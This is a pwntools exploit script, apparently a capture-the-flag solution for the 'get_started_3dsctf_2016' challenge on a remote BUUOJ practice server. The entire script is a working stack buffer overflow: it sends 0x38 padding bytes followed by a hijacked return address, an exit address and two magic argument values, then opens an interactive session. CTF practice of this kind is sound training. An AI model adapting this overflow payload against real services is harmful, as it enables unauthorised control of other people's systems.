from pwn import *

#r=process('./get_started_3dsctf_2016')
r= remote("node5.buuoj.cn",25318)
context.arch="i386"
context.terminal=["tmux","splitw","-h"]
#gdb.attach(r)


payload=b'b'*(0x38)+p32(0x80489A0)+p32(0x0804E6A0)+p32(814536271)+p32(425138641)
r.send(payload)



r.interactive()